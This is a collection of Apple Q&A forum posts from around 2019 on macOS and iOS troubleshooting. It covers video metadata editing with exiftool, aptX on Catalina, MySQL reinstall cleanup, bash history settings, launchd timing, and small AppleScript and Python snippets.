reinstall the app. The app did not require connecting with any third party data, such as signing in with a google account.\nIs there any way that I can \"anonymize\" my device without having to completely reset it?\n\nA: It depends on how the app was made.

This is how persistent properties have been implemented, but now this can run into accessibility permissions issues, since modifying an application will cause the system to see it as a different one - one that hasn't been given permission.\nThe solution is to code sign your application (you can use a self-issued certificate) or make the scripts in the bundle run-only.  You will lose persistent properties, but you can use some AppleScriptObjC to implement preferences via NSUserDefaults if you need to keep stuff between runs.\n\nA: Select the file in Finder and Get Info, then make sure it's Locked.\n\nNote: This \"works\" because it stops the script from modifying itself, however note that this may stop the script from working correctly.

There doesn't seem to be a right-click, Save as kind of function. I have an Apple keypad for it also, but I don't see how one does mouse-type functions like I'd do in Win7 or Win10.\n\nA: You can technically install one of the many PDF viewers for iOS from the App Store, save the PDFs within the app, and you are good to go. As long as the PDF is saved locally, you won't need an active Internet or Wi-Fi connection.\nOne of the most popular and and 1st party app is Apple Books. If you couldn't find it installed, you can open the referred link on your iPad and install it.\nOnce installed, you can export the desired PDFs into Apple Books app, either by syncing with iTunes, or wirelessly via AirDrop from another Mac. Once you have the app installed, you can also open a PDF file in a web browser on your iPad (such as Safari, or a 3rd party browser) while online, and export the PDF file into Apple Books. Once exported, the PDF remains available for offline viewing.\nThere are also a variety of other ways to get the PDF into Apple Books and a variety of other apps (such as Amazon Kindle) that lets you do the same. Totally depends on your preferences, availability and your use of other devices and services etc.\n\nStep by step instructions to save a PDF file open in a Web browser to Apple Books app\n\n\n*\n\n*Make sure you have the Apple Books app installed on your iPad.

Doing it usualy at night, or a few days later, the time of the received item needs to be adjusted in order to have a clean time related photo album on the iPhone.\nI use the Photos app on my mac in order to change the time & location, export the new item in my desktop and then send it back to the iPhone via AirDrop (at this time I actually get 2 items : the old one with the \"wrong\" time and the new one with the \"correct\" time).\nThe issue is that it doesn't apply to video, the new timeline is the one of the exportation (i.e a moment ago). But everything is fine with the photos...\nNote that the new video time do change correctly on the Photos app when adjusting it.\nIs the process to export back video into the iPhone is different than the process to export back photo ?\nI use Mojave 10.14.6 with Photos 4.0 & iOs 12.4.1\n\nA: I can't give you a simple answer, but perhaps I can point you in the right direction.\nWhat you are doing when you change the time/date on your photos is changing its metadata. Metadata is text contained within the file that is read by programs such as the Mac OS Finder when you use Get Info, photo programs, etc... Some programs allow you to edit the metadata, such the Image-->Adjust Date and Time... menu item within the Mac OS Photo app.\nMore generally, media file metadata can be changed using programs called metadata editors. For example, exiftool is a command-line metadata editor that is available on Windows, Mac, etc... TagScanner is a WYSIWYG metadata editor on Windows.\nBoth of the above are quite powerful, but also have a learning curve to use them. I'm guessing you'll want a simple editor for Mac OS, but I can't recommend one since I've been happily using the above for my needs. I briefly looked into the availability of metadata editors for the iPhone and found a couple (e.g., Photo Investigator, MetaPho) that claim to do what you want, but cannot be tested for free (they cost $3-$4).\nOne other thing: there are usually multiple types of date-timestamps for each file, so another thing you may need to discover is which is important for your needs. For example, using the Terminal command exiftool file.mp4 I see 9 timestamps for a recent movie I was sent via WhatsApp:\nFile Name                       : file.mp4\nFile Modification Date/Time     : 2019:09:11 10:24:45+02:00\nFile Access Date/Time           : 2019:09:11 10:24:44+02:00\nFile Inode Change Date/Time     : 2019:09:11 10:24:58+02:00\n...\nCreate Date                     : 2019:08:18 13:04:29\nModify Date                     : 2019:08:18 13:04:30\n...\nTrack Create Date               : 2019:08:18 13:04:29\nTrack Modify Date               : 2019:08:18 13:04:30\n...\nMedia Create Date               : 2019:08:18 13:04:29\nMedia Modify Date               : 2019:08:18 13:04:30\n\n(to focus on the timestamps, I've omitted most of the exiftool metadata listing)\n\nA: So, thanks to @Tony M, I used ExifTool in order to change the metada of my video file with the line : exiftool -quicktime:createdate=\"YYYY:MM:DD HH:MM:SS\" path/my_file_name.file_ext\n", "Q: Is it possible to access Voice Memos from site icloud.com?

Should they be there? \n\nA: No, it's not possible to log into iCloud website and access voice memos. What the setting implies that the iCloud servers are used to backup and store the voice memo recordings, but you'll need the Voice Memos app on iOS/iPadOS or macOS device to access them.\n", "Q: Delayed Voicemail Notification \n*\n\n*Country: USA \n\n*Carrier: AT&T \n\n*iPhone: Xs \n\n*iOS Version: 12.4\n\n\nI’m wondering if this is more carrier-related than phone-related, but on occasion I won’t have a Voicemail notification show up until hours after I miss a call.  This seems to be random as it doesn’t happen for every missed call and doesn’t seem to be exclusive to calls I send to Voicemail or actually miss. \nIs there a way to “refresh” my available Voicemail list (as the normal pull down to refresh motion doesn’t seem to work) manually?  Has anyone else run into this behavior (and more importantly, fixed it)?\n\nA: You would want to update to iOS 12.4.1. It is likely the carrier has a \"carrier update\" that needs to be applied.

There is a lot of conflicting information online about being able to use Steam in MacOS Catalina.\nCan someone confirm if Steam will work on Catalina and if so what I must do to get it to work?\nOr must I stay on Mojave to keep playing my games?\n\nA: Steam will run fine in macOS Catalina. \nHowever, what you may find is that it doesn’t launch initially. If this is the case, totally remove it from your system and then reinstall it from Steam’s website after you’re on macOS Catalina. This will ensure that the correct (i.e. 64-bit) version of Steam is installed for macOS.\nIMPORTANT\nThe fact that Steam itself runs fine does not guarantee that all of the games in your library will run fine. So you will need to do your own due diligence to ensure your favourite games are compatible (i.e. they will need to be 64-bit versions to run on MacOS Catalina).\n", "Q: Does macOS 10.15 Catalina no longer support aptX? On version 10.15 Beta (19A558d) I can't seem to get aptX to work anymore and was wondering if anyone else has aptX working still? Could this possibly have been removed?\nHardware: Late 2018 MacBook Pro 15, Bowers &  Wilkins PX.\n\nTrying to force aptX via Bluetooth Explorer from Additional Tools for XCode 11 GM Seed doesn't seem to be giving any results either. I have tried the following combinations, restarting Bluetooth each time:\n☐ Force use of aptX ☐ Disable AAC\n☐ Disable aptX ☑️ Enable AAC\nResult: Active Codec: AAC\n☑️ Force use of aptX ☑️ Disable AAC\n☐ Disable aptX ☐ Enable AAC\nResult: Active Codec: SBC\n☑️ Force use of aptX ☐ Disable AAC\n☐ Disable aptX ☑️ Enable AAC\nResult: Active Codec: AAC\n\n\nA: I was testing the theory today with a codec name error. \nIndeed, aptX remained 100 %. Very similar to\nBug with the name. I hope they correct in the future. Checked in Bluetooth Explorer. Ran using the check box in the SBC codec menu and aptX to check bitrate in one case or another. \nIt turned out when put in priority aptX the bitrate was exclusively 384 kb/s and it was not possible to change it by any software, which is possible only with this code. Then banned aptX and it turned out bitrate which is possible only in SBC 327 kb/s. \nPlus it was possible to change bitpool, which immediately led to the fall of bitrate and sound quality.\n\n\n\nA: For those still looking, it appears that aptX support has been silently removed from macOS Catalina (10.15); even in the public release.\n\nA: I was trying to get my Sony wh-1000xm3 headphones to work in AAC / aptx (they were stuck in SBC despite following the usual guides) . I was unable to get them to work as expected until I enabled the \"Priority on Sound Quality\" option in the Headphone android app. Presumably the same option exists in the iOS app\n\n\nA: I had the exact same issue with a 13 inch model. Searching elsewhere, some people on r/headphones discussed what is better between AAC and aptX and seems to have agreed AAC is better. In that sense, I think I'm satisfied to listen to my PXs on AAC.\nI didn't realize Catalina had this issue until I switched my PXs from my iPad to my Mac and heard a huge difference in the balance between frequencies (equalizers off on both devices), so checked in my Bluetooth menu and found it was also to AAC, like your situation. For what it's worth, I also ran sudo defaults write bluetoothaudiod \"Enable AptX codec\" -bool true and with \"Enable AAC codec -bool false (and restarted my Bluetooth module). They had no impact – but I think does the same as your approach.\nHowever, when I'm using my PXs, it's to focus on work, not music. If sound quality really bothers you and you prefer aptX, I hope there's another solution! Maybe this is just a beta build bug!\n\nA: There is some information on Reddit claiming that enabling aptX does really give aptX despite the fact that it is shown as \"AAC\". Haven't tested this myself yet. Check this: https://www.reddit.com/r/MacOS/comments/dh2hl4/aptx_support_in_macos_catalina_public_release/f59j81u/\nUPDATE: Noticed a good sound quality, checked the Mac menu - it was still saying \"SBC\". However, when I checked my headphones they were blinking with white light which means AptX according to its manual (Avantree Audition Pro). This gives me hope that it's just a bug in UI.\nUPD2: there is one more confirmation to this assumption, check this answer on Apple forum: https://discussions.apple.com/thread/250719060?answerId=251583274022#251583274022\n\nA: After I updated to macOS 10.15.2 aptX is back.\nWhen I paired my BeyerDynamic Amiron Wireless to Mac mini, I got the voice, aptX active.\nNow not so sure it's working.

Or... perhaps I should abandon iTunes / Podcasts and use a different set of apps?  Listening anywhere besides the iPhone is very secondary since it is always with me and I can control it from my watch.  But it just seems like a relatively simple problem to solve, I'm surprised its this hard to get things to work right.\n\nA: I suggest starting over -- that is \n1) unsubscribe from all podcasts, and restart all devices. Then,\n2) do Settings -> Podcasts -> Sync Podcasts and/or Preferences => Store => Sync Playback as described in the notes below your question. Then,\n3) Plug in each device to your computer with iTunes open, select the device as shown in the first image, go to the `Summary` section for that device and make sure `Sync with this iPhone over Wi-Fi` is checked.\n\n\n4) Finally, subscribe one at a time just from one iOS device only\n5) After the above is working, subscribe from the other devices\n\nI say this first because I've been subscribing to podcasts using iTunes on my Mac and my iPhone for about a decade without problems like you describe, and in the last several years I never even go to iTunes on my computer anymore.  I just subscribe to new Podcasts from my iPhone and things sync fine. Second, my experience is \"starting fresh\" tends to solve most computer-related problems.\n", "Q: Does the Catalina XNU kernel still recognize 32-bit binaries? Does 10.15's dyld? I've seen lots of commentary repeating the end result \"32-bit apps are no longer supported.\"\nBut that leaves many unanswered technical questions.  Does 10.15's XNU still recognize 32-bit binaries?  Does 10.15's dyld still recognize them?\n\nA: \nDoes 10.15's XNU still recognize 32-bit binaries?\n\nThey are still recognized as executables, but attempting to execute one results in a \"bad CPU type in executable\" error, just as if you were trying to run an PowerPC or ARM binary (and different from an incomprehensible file, which will result in an \"exec format error\" error).\n\nDoes 10.15's dyld still recognize them?\n\nRecognize them as what? It'll recognize that an .dylib with a 32-bit slice is a library, if that's what you mean, but it'll refuse to load it into a 64-bit process.\n", "Q: How do I get dual colour theme for numerals duo watch face? I am using the Beta of watchOS 6. In the keynote, I saw the numerals duo watch face with two different colors for each number. Is this exclusive for series 4 or series 5? I am Series 3 user. I did update to the GM version but did not find this color scheme in numerals duo. Attached some screenshots of the Apple website and the keynote.\nHow do I get such a colour theme for numerals duo watch face? \n\n\nA: Source:\nApple Watch Series 3 running watchOS 6 are limited (at this time) as to the colors used in the Numerals Duo face.  S4 and above can have multiple colors.\nS3 watches can also use the Numerals Mono face.  That's just an outline of the numbers with no color fill.\n", "Q: Path to user directory when username is unknown Some colleagues and I have our cloud storage (e.g. Dropbox) syncing to our macs.\nThe local path to a particular folder in our synchronised cloud storage looks like /Users/{$USERNAME}/CloudSync/Projects/Hello World/\nWhen we share links with each other we currently share the links provided by our cloud service which opens the app or website to view them. It would be great if we could just share a path to our local copies with each other, but obviously I don't want to have to manually type their usernames into the path each time. Is there some sort of alias for username that can be used instead?\n\nA: The standard path to /Users/[current user] is tilde ~\nSo the path to /Users/{$USERNAME}/CloudSync/Projects/Hello World/ for any user is\n~/CloudSync/Projects/Hello World/\n", "Q: Use QuickTime synth as MIDI output device QuickTime apparently has a built-in MIDI synthesizer. I would like to send MIDI output to a virtual MIDI device that will use this synthesizer. Can this be done?\n\nA: Quicktime 7 had Midi playback capabilities, but no method to generate its own data for output that I'm aware of.\nIt didn't sound very good anyway & almost no-one ever used it for anything even half serious ;)\nQuicktime 7 is deprecated & will no longer work in Catalina. Newer Quicktime versions do not have Midi playback capability.\nIn Applications/Utilities/AudioMIDI Setup there is a routing device known as the IAC Bus [Window menu or Cmd/2 to show it]that can route Midi between any capable apps. It's always been somewhat under-used & tbh even as a sound engineer who's been using Midi for 35 years I haven't had occasion to use it since maybe the early 90s.. honestly, I've forgotten how you even wire it up these days.\n\nI'm sure you'd be better off finding a cheap or freeware Midi sequencer app - Garageband comes with the Mac, but there are others.\n", "Q: Does anyone know how to create an Apple ID? Account creation is failing I'm a software engineer who's trying to create an Apple ID so I can download a copy of macOS that I can use for development - but, I'm not sure how to create an Apple ID - I'm, not smart, and, I need help.\nI've tried creating an Apple ID via:\n\n\n*\n\n*The web browser; and\n\n*The App Store on my MacBook Pro.\n\n\nI've used two different networks to do this, but, alas, I have failed myself, and those around me.\nWhenever I try to create an Apple ID via the web browser, account creation fails immediately after I submit the e-mail verification code - it says \"your account could not be created at this time\".\nWhenever I try to create an Apple ID via the App Store, account creation appears to silently fail at the end of the process.

Perhaps a bit overkill for your needs, but it allows you to route audio channels to equalizers, to separate or combined files, etc. It's extremely powerful.\nGiven your use case though, I think Soundflower (which is free) may be just the ticket. Soundflower creates a virtual audio device that allows you to listen to your audio channel and use it as an input at the same time. (For example, you could record and listen to a radio broadcast at the same time).\n", "Q: AirDrop over Access Point BLE/WiFi Mesh Would it be possible to set up a BLE mesh so that IPhones and Macs could pair to the mesh, initiate AirDrop, and use the access points as wifi repeaters (or just run the data through the existing network), allowing airdrop to happen at longer ranges than the native antennas of the devices would allow?\n\nA: Airdrop already forms a mesh and doesn’t need WiFi networks to broadcast airdrop. \nExisting  Apple hardware \nbuilds a point to point mesh and you can airdrop across the mesh far larger distance than the range of your device alone. \nSo you don’t need to build anything but could have a functioning mesh. \nThere are improvements in hardware about to ship so we can revisit this answer when iOS 13 ships and matures and the new hardware ships and embargo expires for people that have seeded devices for review. \n", "Q: Minimum disk partition for Windows installation increased to 48 GB? I am currently on Mac OS Mojave 10.14.6. Boot camp assistant is not allowing me to reduce the Windows 10 partition size to a value lower than 48 GB. I only have a 256 GB SSD and 48 GB seems to be a lot. I read online and watched a few videos on Boot Camp and most of them stated that Boot Camp requires a minimum of 30 GB. (They are probably outdated?)\nMicrosoft's minimum system requirements indicate min disk space as 32 GB. Is there any way to override Boot Camp assistant to allow for a lower size partition? Is 48 GB the new minimum space requirement?\nMy only intention of using Windows is for playing games off my external hard disk. \nI am also considering to install Windows 7 or 8.1 to save some space while maintaining compatibility with games. Thus, allocating 48 GB is not optimal.\n\nA: \nBoot camp assistant is not allowing me to reduce the Windows 10 partition size to a value lower than 48 GB.\n\nThat sounds about right as a practical lower limit for Windows 10. The Microsoft system requirements you're referring to are the absolute minimum resources required for the operating system to be installed; using Windows with that little disk space will be painful, and you are likely to have difficulty installing and using even basic desktop applications, let alone games.\n(Running games from an external hard drive is inadvisable. Not all games will even run from an external drive, and performance will suffer heavily.)\n\nI am also considering to install Windows 7 or 8.1 to save some space while maintaining compatibility with games.\n\nDon't. Both of those operating systems have exited their mainstream support phases, and the extended support phase for Windows 7 is ending in January 2020. Using them for a new system is a bad idea.\n", "Q: Dual booting older (2011) MBP into Windows and Linux (not macOS) I was given a 8,2 15\" MBP, and b/c its graphics won't allow me to install Mojave, I want to turn it into a dual booted Linux/Windows machine. (I'm a developer, and find myself needing to tread into both worlds more and more.)\nI found this article to help with this... except I don't really need to keep a viable older macOS on this machine. Just Win7 (which I'm gonna quickly upgrade to Win10) and Ubuntu Desktop. How would you, after getting rEFInd installed, and Win/Linux installed, excise the macOS still there? Or is this even the wrong approach?\n\nA: I read your this article. Follow the steps outlined in the article with these adjustments.  I'd set up three partitions instead of four: macOS, swap and Windows. I'd adjust the macOS partition to the size you want to for linux. I'd install linux over the top of the macOS partition. \nI've set up a triple boot system before but I haven't tried this procedure. Good luck. \n", "Q: In numbers or pages for ios, Is it possible to force a trend line to start at (0,0)? I was wondering, if, in whatever the newest version of ios, numbers, and/or pages, it is possible to force a trendline through a point on a 2D scatter graph (e.g. the origin (0,0)).  I was hoping to not have to buy excel just because one teacher wants this specific thing.\nEdit: Here is a list of what my teacher requires me to do (its a college biology class):\n1) Show numbers to 1-2 spaces past decimal point.\n2) Adjust document page setup so all cells of a table appear on the same page.\n3) Always plot the independent variable on the X-axis\n4) Always plot the dependant variable on the Y-axis\n5) Label both axes with the quantity being measured\n6) Except where data is processed as a ratio, the numbers must be associated with specific units.  Include on the graph axes or in table cells.\n7) Number the axes appropriately at regular intervals\n8) Show the equation for the trend line.\n9) There must be a good title [insert long explanation here]\n10) If there is more than a single data set plotted on a graph, distinguish between them via shapes or colours.\n11) Adjust the scales of the X- and Y- axes so that:\na) All data points fit on the graph\nb) Both axes are reasonably close to the same length.\nc) You are using a reasonable portion of the overall page of graph paper.\n12) a) For a standard curve, from which values will be extrapolated (which I am doing in this case), draw a best-fit straight line.  In a linear graph the line is typically forced to go through the origin.\n1\nb) For graphs that aren't standard curves, if the points seem to line up in a straight line or if the relationship is known to be linear, dea a best-fit straight line (which may or may not go through the origin)\nc)....(not applicable to my question)\nd)....(not applicable to my question)\ne) Smoothing curves for aesthetic reasons \"MUST\" be avoided.\nf) Adding portions of lines on graphs for which there is no data must be avoided.\n\nA: The trendlines are based on the data and can't be forced thru any points. What you could do is have the app print out the equation for the trendline and plugin 0 to see what new trendline looks like. You can then adjust the coefficients so that you have a new trendline thru 0.0. This may not be a good representation for the trendline. \nAnother possibility is to add several pairs of 0.0,0.0 to the row and column you are plotting. Start with just 2 or 3 pairs and see how that affects the trendline. Depending on your trendline, you may need more pairs. this will weight that part of trendline more than other parts and will cause a shift in the line.\nIt should be noted that the trendline you enforce will probably not represent the data very well. If the value at 0.0 is actually 245, while the other values you have are in the range of 200-250, for example, forcing it to zero at zero is a bad idea. Adding data points is also a bad idea because you inputting data that doesn't exist grossly changes your data set.\nThe trendline is a representation of the data in a relatively simple manner. Changing it makes it no longer representative of the data. If you suspect your data at 0.0 should be 0.0, then this is probably a method to determine that.\n", "Q: Cannot Delete Mailboxes in Mail.app macOS 10.14.6, Mail.app v. 12.4 (3445.104.11), 2015 iMac. The software is up-to-date.\nI was looking for a possibly-deleted email, and searched several Time Machine backups. I found one possibility, and restored it. It turned out not to be what I sought, so I deleted it. \nNow, however, I'm left with extra mailboxes in Mail.app:\n\nYou can see them here as \"com.apple.Mail Backup\" and \"Recovered Messages.\" \"Recovered messages\" is empty, and I cannot delete either mailbox. Similar mailboxes in the past (when I've used TM to recover emails) were easily deleted.\nI have rebuilt them both (Mail > Mailbox > Rebuild), which only makes the single I email I thought might be my target reappear in the \"Recovered Messages\" email folder.\nI've also restarted the computer, both normally and into safe mode. These had no effect either.\nI used the Mac's Finder search, and found three files named \"com.apple.mail - note the difference that the word \"mail\" is not capitalized, as it is in these mysterious mailboxes.  These files are all located on a mounted bootable backup disk which is updated nightly using ChronoSynch. The file path displayed in the Finder window says these files are located at the root level of the bootable disk in a folder named \"private.\" Opening the bootable disk reveals no folder named \"private.\"\nI'm mystified. Can anyone explain what's going on here? How can I get rid \nof these folders?\nEDIT: I moved the \"Recovered Messages\" mailbox up to the top of the mailbox list, then quit and restarted mail, selected the moved mailbox, then used the \"Delete Mailbox\" command at Mail > Mailbox > Delete Mailbox. The mailbox disappeared. Perhaps moving it had something to do with the success, or perhaps thinking so is a post facto fallacy. The other mailbox remains.\n\nA: I had the exact same problem with a mailbox restored via Time Machine.\nWhat worked for me was quitting Mail.app, deleting the mailbox from ~/Library/Mail/V6/long-string/, opening Mail.app, and deleting the offending mailbox one more time.\n", "Q: Failure to install mysql on macOS Mojave I've moved to a new machine and installing MySQL is turning out to be quite an issue (the last time I installed it on a mac it was quite seamless).\nI used two approaches to install MySQL: brew and the offical installer\nBrew:\nI started with brew install mysql. This installed the latest version of MySQL. It initially worked and I could log into the root user without a password. When I tried to set the password for the root account I ended up being locked out of the root account. I proceeded to uninstall that version of MySQL and tried a different version (5.7). When I installed that I got the following error: ERROR 2061 (HY000): Authentication plugin 'sha256_password' reported error: Authentication requires SSL encryption.

I did not add anything to my PATH, should I have done that?\nAdditionally, this is how the MySQL widget in the System Information looks like. I tried pressing Start MySQL Server a bunch of times, it would start and almost immediately stop.\nCan anyone suggest a clean way in which I can remove all these defunct installations and have a clean MySQL install? \n\n\nA: MySQL 8 makes big changes compared with previous version 5.7. Downgrading directly to the lower version 5.7 from 8.x won't work.\nSolution: \n\n\n*\n\n*Uninstall all MySQLs you've installed. \n\n*Since you're setting up a new machine, there's no existing database. Just clean up the broken database.\n# brew-installed mysql\nrm -rf /usr/local/var/mysql\n\n# db from the official installed\n# should be located at /usr/local/mysql (I'm not very sure)\nls -ald /usr/local/*mysql*\n# then delete any folders listed by ls\n\n\n*You'd better remove the conf file /usr/local/etc/my.cnf as well.\n\n*Reinstall MySQL.\n", "Q: How to \"Divorce\" Macbook's original Apple ID? An MBA (Macbook Air) is configured with High-Sierra.  It was bought and configured with a relatives Apple ID.  I inherited the MBA: the iCloud account is set to my Apple ID.

I am having an issue with my very old Macbook Pro 17\" which is the early 2011 model and would appreciate any advise to that end!\nThe wifi works only rarely and it just gets disconnected all of a sudden! Then, it becomes unable to find any network and I have to turn it off and on many times to bring it back which goes in a minute again!\nSo, my question is if it is possible to change the WiFi card for this model?\nThank you very much for your help already!\n\nA: The short answer is Yes.\nIt's actually one card for both Airport/Bluetooth connectivity and the part numbers you can choose from are 661-5867 (Bluetooth 2.1) and 661-6510 (Bluetooth 4.0). These cards can be used in multiple MacBook Pro models, including all of the early 2011 models. \nBe careful not to make the mistake of getting the one suited for the Late 2011 17\" model, as this is not the same - although the 13\" and 15\" Late 2011 models do use the same card as your MBP.\n", "Q: How to get RFID scanner to connect to MacOS I am using a RFID scanner: https://www.aliexpress.com/item/1857525758.html\nThis scanner connects via USB to Windows and Rasbian without special firmware. When I plug it into my Mac, however, it lights up, but does not scan RFID tags.\nIt is detected in the system information, which displays:\nIC Reader:\n\n  Product ID:   0x0035\n  Vendor ID:    0xffff\n  Version:  1.00\n  Serial Number:    08FF20171101\n  Speed:    Up to 12 Mb/sec\n  Manufacturer: IC Reader\n  Location ID:  0x14100000 / 28\n  Current Available (mA):   500\n  Current Required (mA):    200\n  Extra Operating Current (mA): 0\n\nBecause MacOS is Unix-based, I assumed it work the same on the system. Does anyone know how to get the RFID scanner to connect to my Mac?\n\nA: I have a scanner that looks exactly the same and works perfectly on Mac.\nEssentially this device works like a USB keyboard, and thus requires no special operating system or driver support.\nThe device is NOT supposed to show up in The Finder sidebar, contrary to other suggestions here.\nTo test the device, open Notes, TextEdit or similar app - then scan a tag with the scanner. The number should show up (make sure you can enter numbers with your normal keyboard - i.e. a text input area needs to be in focus).\nIf it doesn’t work it can be an issue with the port, cable or similar. Check System Report to see if the device is reported as connected on the USB bus.\nUpdate: After you have added the USB information from System Report to your question, it is clear that the hardware you have is a non-standards compliant \"China clone\" (for example the vendor code is 0xffff), which does seem to be USB HID, but not emulating a keyboard. \nIn this case, you will need a driver. It seems multiple people have had problems getting this device working on Linux, and someone used a lot of time reverse engineering the Windows program supplied with the device, as the manufacturer is obviously not interested. You can download the Linux software here:\nhttps://github.com/merbanan/rfid_app\nhttps://github.com/Simpleyyt/libfunction_so_usb\nIt uses libusb so it can probably be compiled and works on a Mac as well.

I use Microsoft Outlook at work.\nI happen to miss appointments/meetings because I do not notice the reminder of the event. Later I notice that the reminder popped up in a different screen on the main desktop.\nIs there a way to make the reminder more prominent on Mac for Microsoft Outlook ?\nIdeally I would like to see the reminder on all three screens no matter whether the desktop is shown or another virtual desktop.\n\nA: I solved this by adding my Microsoft Outlook calendar account to the Calendar app that came with the MacBook. There, you have more control and by displaying the calendar notifications as Alerts, it always sticks on the top right corner of the screen unless you close it. You can also separate your work and default calendars if you don't feel like combining the two.\n", "Q: ignore duplicates when browsing bash history Assum I have the following command history:\n\n\n*\n\n*A\n\n*B\n\n*B\n\n\nWhen pressing the up arrow on most linux terminals this would cycle like:\n\n\n*\n\n*B\n\n*A\n\n\nOn osx terminal however it got me:\n\n\n*\n\n*B\n\n*B\n\n*A\n\n\nHow can I regain the former behaviour?\n\nA: Adding \nexport HISTCONTROL=ignoreboth:erasedups\n\nto ~/.bash_profile worked for me.\n\nA: From man bash:\nHISTCONTROL\nA colon-separated list of values controlling how commands are saved on the history list. If\nthe list of values includes ignorespace, lines which begin with a space character are not\nsaved in the history list. A value of ignoredups causes lines matching the previous history\nentry to not be saved. A value of ignoreboth is shorthand for ignorespace and ignoredups. \nA value of erasedups causes all previous lines matching the current line to be removed from\nthe history list before that line is saved. Any value not in the above list is ignored.\n\nTo mimic the behavior you are used to, run echo $HISTCONTROL on your Linux system and then set the same value on your Mac.\n", "Q: Is it possible to prevent launchd running a missing task on wake? I have a launchd task configured to run once an hour using the StartCalendarInterval key to set specific times at which the task will run.\nHowever, the default behaviour of this is that, when an interval is missed (i.e- computer was asleep) the task will immediately run at the next available opportunity (i.e- on wake).\nIs it possible to disable this behaviour in my plist file?\nI haven't found any obvious key(s) for controlling this, and the only other thing I can think of is to check the current time in the task itself, but this means duplication of timing behaviour (set the time in the plist, and then check it in the task itself).\n\nA: shell script wrapper\nlaunchd has no built-in method for limiting tasks that missed their start time. Your idea to use a shell script wrapper to evaluate the desired time and actual time is a reasonable approach.\nFor Power Manager, we provided a drift duration for exactly this purpose. Drift lets the user state how long after a missed trigger time the event is permitted to run.\n", "Q: No macOS update after 10.14.3 on early 2015 MacBook Pro? I have a MacBook Pro (Retina, 13-inch, Early 2015) 3.1 GHZ i7 (16 GB memory, ~380GB diskspace left). It is currently running Mojave 10.14.3.

Equivalent of objcopy -O binary <FILE> <FILE>.bin for Mach-O object files in macOS?\nI want to dump the executable code in the __TEXT segment to a flat binary file on macOS.\nThis can be accomplished on Linux as follows:\nobjcopy -O binary <FILE> <FILE>.bin, where <FILE> would be an ELF file.\nHowever, since objcopy isn't available (or very poorly supported) on macOS (e.g. llvm-objcopy cannot handle Mach-O objects), how can I achieve the same result?\n\nA: I do that using a small Python script, included below:\nimport sys\nfrom macholib.MachO import MachO\nm = MachO(sys.argv[1])\n__TEXT = (cmd for load_cmd, cmd, data in m.headers[0].commands\n          if getattr(cmd, 'segname', '').rstrip('\\0') == '__TEXT').next()\nprint '__TEXT segment: offset %x size %x' % (__TEXT.fileoff, __TEXT.filesize)\nf = open(sys.argv[1], 'rb')\nf.seek(__TEXT.fileoff)\nopen('__TEXT.bin', 'wb').write(f.read(__TEXT.filesize))\n\nSave that code to a file named \"extract.py\" and run it like this:\npython extract.py AppName\n\nwhere AppName is the name of the file that holds the application program.\nThe program will generate a file called __TEXT.bin that holds the contents of the __TEXT segment (i.e. the executable code).\n", "Q: Opening pdf over ssh in Mac terminal As the title says, I do\n> ssh user@host.de \nPassword:     \n> cd documents/ \n> okular example.pdf \nQXcbConnection: Could not connect to display \nAborted (core dumped)\n\nI connect to an OpenSUSE machine over SSH from a MAC OS. \n\nA: I understand it wrongly first.

One can also use rsync to get the PDF from remote system to the local system and view it. \n", "Q: Finder go to Clipboard I’d like to create an Apple script that will use a text path in clipboard and open a new Finder window and go to that path\n\nA: If you can use the Terminal, do\nopen \"`pbpaste`\"\n\n\nA: Assuming that the clipboard contains a string of the form /Users/username/path/to/file, this should work:\ntell application \"Finder\" to reveal (get the clipboard as string) as POSIX file\n\nThe use of the verb reveal ensures that, if a path to a file is supplied, the Finder will display that file in its containing folder rather than launching an application to open the file. If this isn't desirable, replace reveal with open.\n\nA: Taking it a step further, this is not quite a direct solution but it incorporates the direct solution within a larger set of commands. This following AppleScript code will copy to the clipboard, the POSIX paths of the item or items currently selected in Finder, only if Finder is the front most application.  Otherwise it will copy to the clipboard, the highlighted text (which would be an HFS or POSIX style file path) from the current window in the front most application, and reveal the item in Finder.  \nI saved this AppleScript code as \"Copy File Paths From Finder Or Go To Folder.scpt\" to my /Users/My Short Name/Library/Scripts/ folder, which makes it available to use from within any application, by selecting it from the Script menu in the menu bar.\nI find this solution to be much more convenient than using Finder's built in \"Go To Folder\" command.\ntell application \"Finder\" to set finderIsFrontmost to frontmost\n\nif finderIsFrontmost then\n    -- Copy Selected Files In Finder, As Path Names\n    tell application \"System Events\" to keystroke \"c\" using {option down, command down}\nelse\n    -- Copy Selected File Path Text In Frontmost App (HFS or POSIX Style Paths)\n    tell application \"System Events\" to keystroke \"c\" using {command down}\n    delay 0.1\n    -- The \"-R\" Reveals Copied File Path In Finder, Rather Than Opening If It's A Path To A File\n    try\n        do shell script \"open -R \" & quoted form of (the clipboard)\n    on error\n        try\n            do shell script \"open -R \" & quoted form of POSIX path of (the clipboard)\n        on error errMsg number errNum\n            display alert errMsg message ¬\n                \"Either The File Or Folder No Longer Exists\" & linefeed & linefeed & \"OR\" & linefeed & linefeed & ¬\n                \"The Selected Text Contains Starting Or Trailing White Spaces\" & linefeed & linefeed & ¬\n                \"Please Make Sure Your Selected Text Has No Empty Spaces At The Beginning Or End Of Your Selection\" as critical buttons {\"OK\"} giving up after 20\n        end try\n    end try\nend if\n\n\n\n\n", "Q: Is there any possible way to program a LPC1768 Microcontroller(using ULINK-ME) on macOS? \n*\n\n*Hardware: Keil LPC1768 development board.\n\n*macOS 10.14\n\n*Flashing/Programming device: Keil ULINK-ME (USB-JTAG adapter)\n\n\nI have tried the VS Code extension platformIO and mbed Studio(standalone), but none seem to find the connected board/flashing device ULINK-ME.\nI have tried the same on a Windows VM running on VMware Fusion with the Keil IDE, that does all of the flashing stuff and that worked, but I would really love to get it natively running on macOS.\nmacOS seems not to mount the board under /dev/tty.* or anything like that, like probably Linux would do.\nIf any questions arise about my setup, please comment, so that I can update this post.\nI appreciate any proper constructive help.\nBest regards.\n\nA: Apparently it is possible.

